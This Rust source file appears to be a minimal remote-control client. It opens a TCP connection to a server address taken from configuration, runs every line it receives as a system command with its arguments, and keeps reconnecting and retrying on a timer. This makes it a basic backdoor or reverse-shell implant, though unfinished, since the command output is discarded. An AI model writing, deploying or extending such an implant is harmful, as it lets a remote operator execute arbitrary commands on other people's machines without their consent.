mod env;

use std::{
    io::{BufRead, BufReader},
    net::TcpStream,
    process::Command,
    time::Duration,
};

use env::init_env;

fn connect(attempts: i32) {
    let client = TcpStream::connect(init_env().server_url);
    match client {
        Ok(stream) => {
            let reader = BufReader::new(&stream);
            for line in reader.lines().flatten() {
                let input: Vec<&str> = line.split_whitespace().collect();
                let cmd = input.first().unwrap();
                let args: Vec<&str> = input
                    .iter()
                    .enumerate()
                    .filter(|&(idx, _)| idx != 0)
                    .map(|(_, &v)| v)
                    .collect();
                if let Ok(output) = Command::new(cmd).args(args).output() {
                    // don't know what to do with the output
                    // maybe use spawn instead?
                }
            }
            connect(init_env().retry_attempts);
        }
        Err(_) => {
            retry_connection(attempts);
        }
    }
}

fn main() {
    connect(init_env().retry_attempts);
}

fn retry_connection(attempts: i32) {
    if attempts == 0 {
        std::process::exit(-1);
    }
    std::thread::sleep(Duration::from_secs(init_env().retry_interval as u64 * 60));
    connect(attempts - 1);
}
